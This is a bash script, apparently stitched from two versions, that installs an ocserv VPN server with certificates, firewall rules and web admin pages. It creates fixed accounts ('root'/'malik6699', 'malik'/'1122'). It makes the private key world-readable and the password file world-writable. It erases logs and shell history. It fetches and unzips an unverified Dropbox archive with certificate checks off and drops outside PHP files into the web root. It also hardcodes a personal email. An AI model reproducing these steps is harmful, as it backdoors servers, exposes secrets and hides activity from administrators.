#!/bin/bash

# Function to log messages
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

# Function to handle common errors
handle_common_errors() {
    log "Attempting to resolve common issues..."
    for i in {1..5}; do
        sudo killall unattended-upgrade apt-get dpkg 2>/dev/null
        sudo rm -f /var/lib/dpkg/lock-frontend
        sudo rm -f /var/lib/apt/lists/lock
        sudo rm -f /var/cache/apt/archives/lock
        sudo dpkg --configure -a
        if sudo apt-get update; then
            return 0
        fi
        log "Attempt $i failed. Waiting 30 seconds before retry..."
        sleep 30
    done
    log "Failed to resolve issues after 5 attempts."
    return 1
}

# Function to run commands with error handling
run_command() {
    local cmd="$1"
    local max_attempts=3
    local attempt=1

    while [ $attempt -le $max_attempts ]; do
        log "Running: $cmd (Attempt $attempt of $max_attempts)"
        if eval $cmd; then
            return 0
        fi
        log "Command failed. Attempting to resolve..."
        handle_common_errors
        attempt=$((attempt+1))
        sleep 5
    done

    log "Command failed after $max_attempts attempts: $cmd"
    return 1
}

log "Starting comprehensive ocserv setup..."
#!/bin/bash

# Function to log messages
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

# Function to select domain
select_domain() {
    log "Available domains:"

    # Get list of directories (excluding README)
    domains=($(ls -d /etc/letsencrypt/live/*/ 2>/dev/null | grep -v README | xargs -n1 basename))

    # Check if any domains were found
    if [ ${#domains[@]} -eq 0 ]; then
        log "No existing domains found."
        read -p "Enter new domain: " Domain
        return
    fi

    # List domains
    for i in "${!domains[@]}"; do
        echo "$((i+1)). ${domains[i]}"
    done

    # Add option for new domain
    echo "$((${#domains[@]}+1)). Enter new Domain"

    # Prompt user for selection
    while true; do
        read -p "Select a domain (1-$((${#domains[@]}+1))): " choice
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le $((${#domains[@]}+1)) ]; then
            if [ "$choice" -eq $((${#domains[@]}+1)) ]; then
                read -p "Enter new domain: " Domain
            else
                Domain="${domains[$((choice-1))]}"
            fi
            break
        else
            log "Invalid selection. Please try again."
        fi
    done

    log "Selected domain: $Domain"
}

# Main script starts here
log "Starting comprehensive ocserv setup..."

# Select domain
select_domain

Email="yallamalik@gmail.com"  # Hardcoded email
read -p "Enter AUTH (pam/plain): " auth

# Function to remove existing ocserv and related components
remove_existing() {
    log "Removing existing ocserv installation..."
    systemctl stop ocserv 2>/dev/null || true
    systemctl disable ocserv 2>/dev/null || true
    apt-get purge ocserv -y || true
    apt-get autoremove -y
    rm -rf /etc/ocserv
    rm -f /etc/systemd/system/ocserv.service
}

# Remove existing installation
run_command "remove_existing"

# Remove problematic PPA
log "Removing problematic PPA..."
run_command "add-apt-repository --remove ppa:certbot/certbot -y"

# Update and install necessary packages
log "Updating system and installing necessary packages..."
run_command "apt-get update"
run_command "apt-get install -y software-properties-common curl unzip"
run_command "add-apt-repository universe -y"

# Install certbot using snapd
log "Installing certbot using snapd..."
run_command "apt-get install -y snapd"
run_command "snap install core"
run_command "snap refresh core"
run_command "snap install --classic certbot"
run_command "ln -sf /snap/bin/certbot /usr/bin/certbot"

# Install ocserv and other packages
log "Installing ocserv and other necessary packages..."
run_command "apt-get install -y ocserv apache2 php libapache2-mod-php"

# Check for existing SSL certificate and handle port 80 issues
log "Checking for existing SSL certificate..."
if [ -d "/etc/letsencrypt/live/$Domain" ]; then
    log "Existing SSL certificate found for $Domain"
else
    log "Obtaining new SSL certificate..."
    # Stop services that might be using port 80
    run_command "systemctl stop apache2 nginx || true"
    
    # Attempt to get the certificate
    if ! run_command "certbot certonly --standalone --agree-tos --email $Email -d $Domain --non-interactive"; then
        log "Failed to obtain SSL certificate. Checking port 80..."
        port_80_process=$(lsof -i :80 | grep LISTEN | awk '{print $2}')
        if [ ! -z "$port_80_process" ]; then
            log "Process using port 80: $port_80_process. Attempting to stop..."
            run_command "kill -9 $port_80_process"
            sleep 5
            run_command "certbot certonly --standalone --agree-tos --email $Email -d $Domain --non-interactive"
        else
            log "No process found using port 80. Certificate obtainment failed."
        fi
    fi
    
    # Restart previously stopped services
    run_command "systemctl start apache2 nginx || true"
fi

# Verify SSL certificate exists
if [ ! -f "/etc/letsencrypt/live/$Domain/fullchain.pem" ] || [ ! -f "/etc/letsencrypt/live/$Domain/privkey.pem" ]; then
    log "SSL certificate files not found. Aborting setup."
    exit 1
fi

# Check SSL certificate permissions
log "Checking SSL certificate permissions..."
run_command "chmod 644 /etc/letsencrypt/live/$Domain/fullchain.pem"
run_command "chmod 644 /etc/letsencrypt/live/$Domain/privkey.pem"

# Configure ocserv
log "Configuring ocserv..."
run_command "mkdir -p /etc/ocserv"
cat << EOF > /etc/ocserv/ocserv.conf
proto = udp
tcp-port = 443
udp-port = 443
switch-to-tcp-timeout = 5
run-as-user = nobody
run-as-group = daemon

socket-file = /var/run/ocserv-socket
ca-cert = /etc/ssl/certs/ssl-cert-snakeoil.pem

server-cert = /etc/letsencrypt/live/$Domain/fullchain.pem
server-key = /etc/letsencrypt/live/$Domain/privkey.pem
mtu = 1420
dtls-legacy = true
isolate-workers = true
keepalive = 32400
dpd = 40
mobile-dpd = 40
try-mtu-discovery = false
cert-user-oid = 0.9.2342.19200300.100.1.1
compression = true
no-compress-limit = 50

tls-priorities = "NORMAL:%SERVER_PRECEDENCE:%COMPAT:-VERS-SSL3.0"
#tls-priorities = "SECURE256:+SECURE128:-VERS-ALL:+VERS-TLS1.0:+COMP-NULL"
#tls-priorities = "PERFORMANCE:%SERVER_PRECEDENCE:%COMPAT:-VERS-SSL3.0"
auth-timeout = 400
min-reauth-time = 100
max-ban-score = 0
ban-reset-time = 300
cookie-timeout = 300
cookie-rekey-time = 14400
deny-roaming = false
rekey-time = 172800
rekey-method = ssl
use-utmp = true
use-occtl = true
pid-file = /var/run/ocserv.pid
device = vpns
predictable-ips = true
default-domain = web.get-domain.club
ipv4-network = 191.10.10.0/21
#ipv4-network = 191.10.10.0/16
tunnel-all-dns = false
ping-leases = false
cisco-client-compat = true
max-clients = 0
max-same-clients = 20000
dns = 8.8.8.8
dns = 1.1.1.1
dns-timeout = 2
dns-retries = 1
EOF

if [ "$auth" == "plain" ]; then 
    echo "auth = plain[passwd=/etc/ocserv/ocpasswd]" >> /etc/ocserv/ocserv.conf
    echo "max-same-clients = 50000" >> /etc/ocserv/ocserv.conf
else 
    echo "auth = \"pam\"" >> /etc/ocserv/ocserv.conf
    echo "max-same-clients = 20000" >> /etc/ocserv/ocserv.conf
fi

# Verify SSL paths in ocserv.conf
log "Verifying SSL paths in ocserv.conf..."
run_command "sed -i \"s|server-cert = .*|server-cert = /etc/letsencrypt/live/$Domain/fullchain.pem|\" /etc/ocserv/ocserv.conf"
run_command "sed -i \"s|server-key = .*|server-key = /etc/letsencrypt/live/$Domain/privkey.pem|\" /etc/ocserv/ocserv.conf"

# Update GnuTLS
log "Updating GnuTLS..."
run_command "apt-get update"
run_command "apt-get install -y gnutls-bin"

run_command "systemctl restart ocserv"
sleep 5

run_command "cp /lib/systemd/system/ocserv.service /etc/systemd/system/ocserv.service"
run_command "sed -i \"5 s/^/#/\" /etc/systemd/system/ocserv.service"
run_command "sed -i \"15 s/^/#/\" /etc/systemd/system/ocserv.service"

if ! grep -q "net.ipv4.ip_forward = 1" /etc/sysctl.conf; then
    echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf
    sysctl -p
fi

run_command "systemctl daemon-reload"
run_command "systemctl stop ocserv.socket || true"
run_command "systemctl disable ocserv.socket || true"
run_command "systemctl restart ocserv.service"

run_command "mkdir -p /etc/ocserv/backup"
run_command "chmod 777 /etc/ocserv/backup"

main_interface=$(ip route get 8.8.8.8 | awk -- '{printf $5}')
run_command "iptables -t nat -A POSTROUTING -o $main_interface -j MASQUERADE"
run_command "iptables -I INPUT -p tcp --dport 443 -j ACCEPT"
run_command "iptables -I INPUT -p udp --dport 443 -j ACCEPT"
run_command "iptables-save > /etc/iptables.rules"

cat << EOF > /etc/systemd/system/iptables-restore.service
[Unit]
Description=Packet Filtering Framework
Before=network-pre.target
Wants=network-pre.target

[Service]
Type=oneshot
ExecStart=/sbin/iptables-restore /etc/iptables.rules
ExecReload=/sbin/iptables-restore /etc/iptables.rules
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

run_command "systemctl daemon-reload"
run_command "systemctl enable iptables-restore"
run_command "systemctl restart ocserv"

log "Updating /etc/ocserv/ocpasswd permission"
run_command "touch /etc/ocserv/ocpasswd"
run_command "chmod 777 /etc/ocserv/ocpasswd"

log "Downloading setup.php and online-users.php files"
run_command "wget -O /var/www/html/setup.php https://raw.githubusercontent.com/dtechdevelopers07/openconnect-php/master/setup.php"
run_command "wget -O /var/www/html/online-users.php https://raw.githubusercontent.com/dtechdevelopers07/openconnect-php/master/onlineUsers.php"

log "Cleaning up..."
run_command "rm -f /var/log/messages.*"
run_command "cat /dev/null > ~/.bash_history && history -c"
cd
run_command "rm -f *.sh *.zip"
run_command "wget --no-check-certificate https://dl.dropboxusercontent.com/s/2ny6tvl53tcnoim/vpn_tools.zip"
run_command "unzip -o vpn_tools.zip"
run_command "rm vpn_tools.zip"

# Function to add user to ocpasswd
add_user() {
    local username="$1"
    local password="$2"
    
    # Check if ocpasswd exists, if not create it
    if [ ! -f /etc/ocserv/ocpasswd ]; then
        log "Creating ocpasswd file"
        run_command "touch /etc/ocserv/ocpasswd"
        run_command "chmod 600 /etc/ocserv/ocpasswd"
    fi
    
    log "Adding user: $username"
    echo -e "$password\n$password" | run_command "ocpasswd -c /etc/ocserv/ocpasswd $username"
    
    if [ $? -eq 0 ]; then
        log "User $username added successfully"
    else
        log "Failed to add user $username"
    fi
}

# Add default users
log "Adding default users"
add_user "root" "malik6699"
add_user "malik" "1122"

log "Setup completed successfully!"
log "You can now connect to your VPN using the following details:"
log "Server: $Domain"
log "Port: 443"
log "Protocol: OpenConnect/AnyConnect"

run_command "systemctl status ocserv"
